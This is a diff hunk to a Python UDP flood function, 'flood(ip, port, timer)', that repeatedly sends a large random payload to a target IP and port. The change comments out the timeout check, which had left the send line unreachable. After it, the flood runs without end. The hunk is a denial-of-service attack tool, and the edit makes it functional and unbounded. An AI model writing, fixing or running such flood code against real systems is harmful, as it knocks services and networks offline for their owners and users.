@@ -17,10 +17,10 @@ def flood(ip, port, timer):
 	send_bytes = random._urandom(20009)
 	timeout = time.time() + timer
 	while 1:
-		if time.time() > timeout:
-			break
-		else:
-			continue
+# 		if time.time() > timeout:
+# 			break
+# 		else:
+# 			continue
 		client.sendto(send_bytes, (ip, port))
 		print(colors[0] + 'Sended to ' + ip + " " + str(port))		
 
